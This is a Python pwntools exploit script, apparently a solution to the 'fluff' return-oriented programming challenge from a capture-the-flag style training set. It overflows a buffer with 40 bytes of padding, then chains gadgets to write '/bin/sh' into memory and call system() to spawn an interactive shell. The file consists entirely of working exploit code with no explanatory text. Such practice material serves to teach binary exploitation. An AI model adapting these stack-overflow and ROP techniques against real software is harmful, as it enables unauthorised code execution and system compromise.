#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./fluff')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x400810
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

def set_address(address):
    return (
        p64(0x400822) + # : xor r11, r11; pop r14; mov edi, 0x601050; ret;
        p64(0x0) +
        p64(0x400832) + #: pop r12; mov r13d, 0x604060; ret;
        p64(address) +
        p64(0x40082f) + # : xor r11, r12; pop r12; mov r13d, 0x604060; ret;
        p64(0x0) +
        p64(0x400840) + # : xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
        p64(0x0)
    )

def set_value(val):
    return (
        p64(0x400822) + # : xor r11, r11; pop r14; mov edi, 0x601050; ret;
        p64(0x0) +
        p64(0x400832) + #: pop r12; mov r13d, 0x604060; ret;
        p64(val) +
        p64(0x40082f) + # : xor r11, r12; pop r12; mov r13d, 0x604060; ret;
        p64(0x0) +
        p64(0x40084e) + # : mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
        p64(0x0) * 2 
    )

address = 0x601090
payload = (
    b"A" * 40 +
    set_address(address) +
    set_value(u64("/bin/sh\x00")) +
    p64(0x4008c3) + # : pop rdi ; ret
    p64(address) +
    p64(exe.plt["system"])
)

io.sendline(payload)

io.interactive()

